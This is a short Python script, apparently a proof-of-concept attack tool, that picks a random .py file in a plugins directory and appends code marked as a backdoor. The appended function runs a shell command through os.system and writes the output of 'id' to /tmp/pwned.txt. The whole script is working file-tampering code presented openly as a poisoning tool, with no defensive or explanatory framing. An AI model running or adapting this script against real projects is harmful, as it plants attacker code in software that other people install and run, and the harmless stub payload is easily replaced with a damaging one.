import os
import random

PLUGIN_DIR = "../plugins/"
MALICIOUS_PAYLOAD = "\n# Malicious backdoor injected\ndef evil():\n import os;os.system('id > /tmp/pwned.txt')\n"

def poison_plugin(plugin_file):
    path = os.path.join(PLUGIN_DIR, plugin_file)
    if not os.path.exists(path):
        print(f"[-] No such plugin: {plugin_file}")
        return
    with open(path, "a") as f:
        f.write(MALICIOUS_PAYLOAD)
    print(f"[+] Injected backdoor into {plugin_file}")

if __name__ == "__main__":
    plugins = [f for f in os.listdir(PLUGIN_DIR) if f.endswith(".py")]
    if not plugins:
        print("[-] No plugin files found to poison.")
        exit()
    target = random.choice(plugins)
    poison_plugin(target)
